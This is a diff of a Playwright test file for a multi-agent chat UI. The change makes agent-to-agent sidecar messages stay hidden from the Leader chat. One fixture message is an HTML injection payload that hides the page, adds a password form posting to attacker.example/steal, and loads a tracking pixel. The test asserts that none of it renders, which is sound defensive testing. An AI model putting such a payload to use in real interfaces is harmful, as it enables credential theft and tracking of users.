@@ -465,7 +465,7 @@ test.describe('Tab switching', () => {
 
 })
 
-test('Room Sidecar A2A is visible and passively rendered in the canonical Leader chat', async ({ page }) => {
+test('Room Sidecar A2A stays internal to the canonical Leader chat', async ({ page }) => {
   const a2a = [
     { seq: 1, ts: Date.parse('2026-08-30T12:00:00Z'), from: 'leader', to: 'caretaker', text: 'Check the Wiki decision.' },
     { seq: 3, ts: Date.parse('2026-08-30T12:00:02Z'), from: 'caretaker', to: 'leader', text: '<style>body{display:none}</style><form action=\"https://attacker.example/steal\"><input name=\"password\"></form>![pixel](https://attacker.example/pixel)' },
@@ -478,11 +478,6 @@ test('Room Sidecar A2A is visible and passively rendered in the canonical Leader
   })
   await page.route(`**/api/sessions/${TEST_SESSION_ID}/room`, route =>
     route.fulfill({ json: { room: 'feather', kind: 'main', role: 'leader', label: 'Main' } }))
-  await page.route('**/api/rooms/feather/residents', route =>
-    route.fulfill({ json: { residents: [
-      { role: 'leader', sessionId: TEST_SESSION_ID, agent: 'omp', title: 'Main', status: 'working' },
-      { role: 'caretaker', sessionId: 'caretaker-session', agent: 'omp', title: 'Caretaker', status: 'waiting' },
-    ] } }))
   await page.route('**/api/sidecar/room-feather/stream', route =>
     route.fulfill({
       status: 200,
@@ -504,17 +499,13 @@ test('Room Sidecar A2A is visible and passively rendered in the canonical Leader
   await page.goto(BASE)
   await page.waitForLoadState('networkidle')
   await selectTestSession(page)
-  await expect(page.getByText(/Leader.*Caretaker/).filter({ hasText: 'Leader' })).toBeVisible()
-  await expect(page.getByText('Check the Wiki decision.')).toBeVisible()
-  await expect(page.getByText('Decision is current.')).toBeVisible()
+  await expect(page.getByText('Check the Wiki decision.')).toHaveCount(0)
+  await expect(page.getByText('Decision is current.')).toHaveCount(0)
+  await expect(page.getByText(/Leader.*Caretaker/).filter({ hasText: 'Leader' })).toHaveCount(0)
   await expect(page.getByText(/\[feather-sidecar room-feather/)).toHaveCount(0)
   await expect(page.getByTestId('chat-panel').locator('form, input[name="password"], img[src*="attacker.example"]')).toHaveCount(0)
   expect(remoteMediaRequests).toBe(0)
   await expect(page.getByTestId('chat-panel').locator('.work-log-active')).toHaveCount(0)
-  const openCaretaker = page.getByTestId('open-room-role-caretaker').first()
-  await expect(openCaretaker).toBeVisible()
-  await openCaretaker.click()
-  await expect(page).toHaveURL(/#caretaker-session$/)
 })
 
 // ── Live SSE updates in the browser ─────────────────────────────────────────
